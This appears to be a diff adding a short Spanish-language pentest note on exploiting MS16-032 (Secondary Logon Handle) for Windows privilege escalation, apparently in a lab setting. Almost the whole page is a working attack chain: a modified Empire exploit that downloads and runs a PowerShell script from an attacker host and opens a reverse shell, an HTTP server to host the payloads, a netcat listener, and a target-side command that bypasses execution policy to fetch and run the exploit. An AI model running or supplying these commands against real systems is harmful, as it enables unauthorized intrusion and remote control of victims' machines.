@@ -1,0 +1,17 @@
+<p><a href="https://pentestlab.blog/2017/04/07/secondary-logon-handle/">WPE-11 - Secondary Logon Handle</a></p>
+
+<p>usando el de empire [https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1]</p>
+
+<h2 id="-modificamos-invoke-ms160932ps1-y-le-agregamos-al-final">| modificamos invoke-ms160932.ps1 y le agregamos al final:</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 444"
+</code></pre></div></div>
+<h2 id="-levantamos-un-server-http-que-tenga--invoke-powershelltcpps1-y-invoke-ms16032ps1">| levantamos un server http que tenga  Invoke-PowershellTcp.ps1 y invoke-ms16032.ps1</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m SimpleHTTPServer 80
+</code></pre></div></div>
+<h2 id="-levantamos-un-listener">| levantamos un listener</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 444
+</code></pre></div></div>
+
+<h2 id="-en-target">| en target:</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:&gt; %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -c  "iex(New-Object Net.Webclient).downloadString('http://10.10.14.14/invoke-ms16032.ps1')"
+</code></pre></div></div>
